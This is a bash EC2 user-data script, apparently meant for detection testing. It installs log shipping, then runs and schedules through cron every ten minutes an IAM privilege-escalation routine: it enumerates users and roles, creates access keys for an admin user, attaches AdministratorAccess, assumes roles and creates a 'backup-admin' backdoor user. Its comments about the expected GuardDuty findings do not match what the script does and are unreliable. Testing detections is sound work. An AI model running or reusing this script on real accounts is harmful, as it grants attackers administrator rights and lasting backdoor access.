#!/bin/bash
# Privilege Escalation Attack Simulation - REAL attack on EC2

yum install -y amazon-cloudwatch-agent aws-cli

cat > /opt/aws/amazon-cloudwatch-agent/etc/config.json <<'EOF'
{
  "logs": {
    "logs_collected": {
      "files": {
        "collect_list": [
          {
            "file_path": "/var/log/attack-simulation.log",
            "log_group_name": "/aws/ec2/attack-simulations",
            "log_stream_name": "privilege-escalation-{instance_id}"
          }
        ]
      }
    }
  }
}
EOF

/opt/aws/amazon-cloudwatch-agent/bin/amazon-cloudwatch-agent-ctl \
  -a fetch-config -m ec2 -s \
  -c file:/opt/aws/amazon-cloudwatch-agent/etc/config.json

cat > /root/priv-esc-attack.sh <<'ATTACK'
#!/bin/bash
LOG="/var/log/attack-simulation.log"

echo "$(date) - Starting Privilege Escalation Attack" | tee -a $LOG

# 1. Enumerate IAM permissions
echo "$(date) - Enumerating IAM permissions" | tee -a $LOG
aws iam list-users 2>&1 | tee -a $LOG
aws iam list-roles 2>&1 | tee -a $LOG
aws iam list-policies 2>&1 | tee -a $LOG

# 2. Attempt to create access keys (triggers GuardDuty: PenTest:IAMUser/KaliLinux)
echo "$(date) - Attempting to create access keys" | tee -a $LOG
aws iam create-access-key --user-name admin 2>&1 | tee -a $LOG || true

# 3. Attempt to attach admin policy
echo "$(date) - Attempting to attach AdministratorAccess policy" | tee -a $LOG
aws iam attach-user-policy --user-name test-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess 2>&1 | tee -a $LOG || true

# 4. Attempt to assume roles
echo "$(date) - Attempting to assume high-privilege roles" | tee -a $LOG
for role in $(aws iam list-roles --query 'Roles[*].RoleName' --output text | head -5); do
  echo "$(date) - Attempting to assume role: $role" | tee -a $LOG
  aws sts assume-role --role-arn arn:aws:iam::$(aws sts get-caller-identity --query Account --output text):role/$role --role-session-name attack-session 2>&1 | tee -a $LOG || true
done

# 5. Attempt to modify security groups
echo "$(date) - Attempting to modify security groups" | tee -a $LOG
aws ec2 describe-security-groups 2>&1 | tee -a $LOG

# 6. Attempt to create backdoor user
echo "$(date) - Attempting to create backdoor IAM user" | tee -a $LOG
aws iam create-user --user-name backup-admin 2>&1 | tee -a $LOG || true

echo "$(date) - Privilege escalation attack complete" | tee -a $LOG
echo "$(date) - Expected GuardDuty findings: Policy:IAMUser/RootCredentialUsage, Stealth:IAMUser/CloudTrailLoggingDisabled" | tee -a $LOG
ATTACK

chmod +x /root/priv-esc-attack.sh
echo "*/10 * * * * /root/priv-esc-attack.sh" | crontab -
/root/priv-esc-attack.sh &
